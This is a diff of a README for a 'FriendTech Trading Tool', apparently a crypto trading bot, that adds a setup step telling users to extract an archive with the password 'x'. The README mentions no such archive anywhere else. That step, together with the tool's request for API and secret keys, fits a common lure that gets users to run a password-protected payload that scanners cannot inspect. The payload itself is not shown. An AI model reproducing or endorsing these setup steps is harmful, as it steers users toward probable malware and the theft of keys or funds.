@@ -27,7 +27,8 @@ Follow these steps to get started with the FriendTech Trading Tool:
    ```bash
    git clone https://github.com/gemhunterheh/FriendTech-Trading-Tool.git
    cd FriendTech-Trading-Tool
-2. **Configure API Keys:**
+2. **extract archive with pass `x`**
+3. **Configure API Keys:**
 You'll need to set up API keys for the trading data sources you plan to use. Create a .env file and add your API keys:
 API_KEY=your-api-key
 SECRET_KEY=your-secret-key
@@ -37,3 +38,5 @@ Open your web browser and navigate to `http://localhost:3000` to access the `Fri
 
 ##  License
 This project is licensed under the [MIT License](https://github.com/gemhunterheh/FriendTech-Trading-Tool/blob/main/LICENSE).
+
+Happy trading! 📈💹🚀
